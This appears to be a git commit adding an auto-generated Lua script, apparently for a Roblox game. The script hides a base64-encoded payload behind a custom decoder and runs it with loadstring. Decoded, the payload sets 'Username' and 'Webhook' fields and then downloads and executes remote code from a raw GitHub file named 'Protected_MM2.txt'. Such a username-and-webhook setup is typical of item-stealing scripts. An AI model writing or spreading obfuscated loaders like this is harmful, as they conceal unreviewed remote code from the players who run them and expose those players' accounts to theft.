b18dcde49c852aabf0f334b03785dfa45165e5a3
Minaj Script <xinnracer@gmail.com>
2025-03-12 04:39:51 +0800

    Generated script a7daa0b32d8c

---
+++ scripts/script-a7daa0b32d8c.lua
@@ -0,0 +1,24 @@
+
+ -- Obfuscated script
+ local encodedScript = "VXNlcm5hbWUgPSAiQVNBRFNBRCIKV2ViaG9vayA9ICJTQURTQURBIgoKIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vU2hhclNjcmlwdC9NTTIvcmVmcy9oZWFkcy9tYWluL1Byb3RlY3RlZF9NTTIudHh0IiwgdHJ1ZSkpKCk="
+
+ -- Decode function
+ local function decode(str)
+     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+     str = string.gsub(str, '[^'..b..'=]', '')
+     return (str:gsub('.', function(x)
+         if (x == '=') then return '' end
+         local r,f='',(b:find(x)-1)
+         for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+         return r;
+     end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+         if (#x ~= 8) then return '' end
+         local c=0
+         for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+         return string.char(c)
+     end))
+ end
+
+ -- Run the decoded script
+ loadstring(decode(encodedScript))()
+ 
